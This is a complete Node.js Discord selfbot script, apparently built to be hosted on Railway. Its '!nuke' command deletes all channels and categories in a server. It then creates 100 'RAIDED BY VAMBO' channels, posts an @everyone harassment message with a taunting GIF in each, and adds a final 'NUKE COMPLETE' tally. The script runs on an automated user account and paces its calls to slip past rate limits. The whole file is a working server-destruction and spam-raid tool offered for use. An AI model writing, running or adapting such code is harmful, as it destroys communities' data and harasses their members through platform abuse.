const { Client } = require('discord.js-selfbot-v13');
const client = new Client();

// Use environment variable for security
const TOKEN = process.env.DISCORD_TOKEN;
const PREFIX = '!';

// Web server for Railway
const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

app.get('/', (req, res) => {
    res.send('Nuke selfbot is running!');
});

app.listen(PORT, () => {
    console.log(`Web server running on port ${PORT}`);
});

client.on('ready', () => {
    console.log(`✅ Logged in as ${client.user.tag}`);
    console.log(`Selfbot is ready in ${client.guilds.cache.size} servers`);
    console.log(`Type !nuke in any channel to destroy the server`);
});

// Helper function to send messages safely (ignores errors from deleted channels)
async function safeSend(channel, content) {
    try {
        if (channel && !channel.deleted) {
            await channel.send(content);
        }
    } catch (error) {
        // Silently ignore errors - channel probably got deleted
        console.log(`⚠️ Could not send message (channel likely deleted)`);
    }
}

client.on('messageCreate', async (message) => {
    // Only respond to your own messages
    if (message.author.id !== client.user.id) return;
    if (!message.content.startsWith(PREFIX)) return;

    const args = message.content.slice(PREFIX.length).trim().split(/ +/);
    const command = args.shift().toLowerCase();

    // ===== FULL NUKE COMMAND =====
    if (command === 'nuke') {
        const guild = message.guild;
        const originalChannel = message.channel;
        
        if (!guild) {
            await safeSend(originalChannel, 'This command only works in servers!');
            return;
        }

        console.log(`💣 Starting nuke on ${guild.name}`);
        
        // Try to send initial confirmation
        await safeSend(originalChannel, '💣 **NUKE INITIATED** - Deleting ALL channels...');

        // ===== STEP 1: DELETE ALL CHANNELS =====
        let deletedCount = 0;
        let deleteFailed = 0;
        
        // Get all channels and sort them (delete non-categories first, then categories)
        const channels = [...guild.channels.cache.values()];
        
        // First delete all non-category channels
        const nonCategoryChannels = channels.filter(c => c.type !== 'GUILD_CATEGORY');
        const categoryChannels = channels.filter(c => c.type === 'GUILD_CATEGORY');
        
        // Delete non-category channels first
        for (const channel of nonCategoryChannels) {
            try {
                await channel.delete();
                deletedCount++;
                console.log(`✅ Deleted: ${channel.name}`);
                await new Promise(resolve => setTimeout(resolve, 800));
            } catch (error) {
                deleteFailed++;
                console.log(`❌ Failed to delete ${channel.name}: ${error.message}`);
            }
        }
        
        // Then delete categories
        for (const channel of categoryChannels) {
            try {
                await channel.delete();
                deletedCount++;
                console.log(`✅ Deleted category: ${channel.name}`);
                await new Promise(resolve => setTimeout(resolve, 800));
            } catch (error) {
                deleteFailed++;
                console.log(`❌ Failed to delete category ${channel.name}: ${error.message}`);
            }
        }
        
        console.log(`✅ Phase 1 complete: Deleted ${deletedCount} channels`);

        // ===== STEP 2: CREATE 100 RAID CHANNELS =====
        console.log(`🔥 Creating 100 raid channels...`);
        
        // Channel name with Zalgo text
        const channelName = 'R҉A҉I҉D҉ ҉B҉Y҉ ҉V҉A҉M҉B҉O҉';
        
        // Raid message with pings
        const raidMessage = `@everyone @here **RAIDED BY VAMBO**

### NEVER SCAM AGAIN SON😂
            😯KICK ROCKS😯
https://media.tenor.com/hWmpAzAlsm4AAAAM/ishowspeed-scary-speed.gif`;

        let createdCount = 0;
        let createFailed = 0;
        let lastCreatedChannel = null;

        // Create 100 channels
        for (let i = 1; i <= 100; i++) {
            try {
                // Create channel
                const newChannel = await guild.channels.create(`${channelName}-${i}`, {
                    type: 'text'
                });
                
                // Send raid message
                await newChannel.send(raidMessage);
                
                createdCount++;
                lastCreatedChannel = newChannel;
                console.log(`✅ Created channel ${i}/100`);
                
                // Delay to avoid rate limiting
                await new Promise(resolve => setTimeout(resolve, 1200));
                
            } catch (error) {
                createFailed++;
                console.log(`❌ Failed to create channel ${i}: ${error.message}`);
                
                // If rate limited, wait longer
                if (error.message.includes('rate')) {
                    console.log('⏳ Rate limited, waiting 5 seconds...');
                    await new Promise(resolve => setTimeout(resolve, 5000));
                }
            }
        }

        // ===== STEP 3: CREATE FINAL ANNOUNCEMENT CHANNEL =====
        try {
            console.log('Creating final announcement channel...');
            
            // Try to create a final stats channel
            const finalChannel = await guild.channels.create('NUKE-COMPLETE', {
                type: 'text'
            });
            
            await finalChannel.send(`@everyone **NUKE COMPLETE!**

🔥 **RESULTS:**
✅ Deleted: ${deletedCount} channels
✅ Created: ${createdCount} raid channels
❌ Failed deletions: ${deleteFailed}
❌ Failed creations: ${createFailed}

**RAIDED BY VAMBO** 💀`);
            
            console.log('✅ Final announcement created');
            
        } catch (error) {
            console.log('Could not create final announcement:', error.message);
            
            // Try one more time with a different name
            try {
                const backupChannel = await guild.channels.create('RAIDED', {
                    type: 'text'
                });
                await backupChannel.send(`**NUKE COMPLETE!**\nCreated ${createdCount} channels`);
            } catch (e) {
                console.log('Could not create any final channel');
            }
        }

        // Log final results to console
        console.log('='.repeat(50));
        console.log('💀 **NUKE COMPLETE** 💀');
        console.log(`✅ Deleted: ${deletedCount} channels`);
        console.log(`✅ Created: ${createdCount} raid channels`);
        console.log(`❌ Delete failures: ${deleteFailed}`);
        console.log(`❌ Create failures: ${createFailed}`);
        console.log('='.repeat(50));
    }
});

client.login(TOKEN);
